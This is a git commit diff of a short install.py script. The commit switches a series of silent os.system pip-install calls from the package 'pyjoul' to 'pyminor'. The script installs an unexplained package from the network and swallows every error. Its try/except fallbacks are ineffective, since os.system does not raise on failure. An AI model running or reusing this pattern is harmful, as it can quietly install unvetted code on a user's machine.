ee4a19ebafcb988119cd90da48107a51cb78c30a
romanova5678 <125207893+romanova5678@users.noreply.github.com>
2023-08-20 17:08:04 +0200

    Update install.py

--- install.py
+++ install.py
@@ -1,11 +1,12 @@
 import os
 try:
-    os.system("python.exe -m pip install pyjoul")
+    os.system("python.exe -m pip install pyminor")
 except:
   try:
-      os.system("python3 -m pip install pyjoul")
+      os.system("python3 -m pip install pyminor")
   except:
       try:
-          os.system("pip install pyjoul")
+          os.system("pip install pyminor")
       except:
           pass
+          
